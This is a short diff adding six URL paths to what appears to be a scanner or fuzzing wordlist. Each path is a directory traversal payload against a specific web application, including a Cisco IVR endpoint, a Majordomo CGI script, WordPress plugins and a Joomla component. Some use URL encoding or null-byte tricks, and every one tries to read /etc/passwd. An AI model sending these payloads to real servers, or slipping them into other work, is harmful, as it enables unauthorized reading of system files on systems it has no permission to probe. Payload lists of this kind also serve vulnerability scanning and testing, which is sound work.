@@ -1,0 +1,6 @@
+/ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd
+/cgi-bin/mj_wwwusr?passw=&list=GLOBAL&user=&func=help&extra=/../../../../../../../../etc/passwd
+/wp-content/plugins/wp-custom-pages/wp-download.php?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+/?action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+/includes/lib/gz.php?file=/themes/../../../../../../../../../etc/passwd
+/index.php?option=com_kp&controller=../../../../../../../../../../../../etc/passwd%00
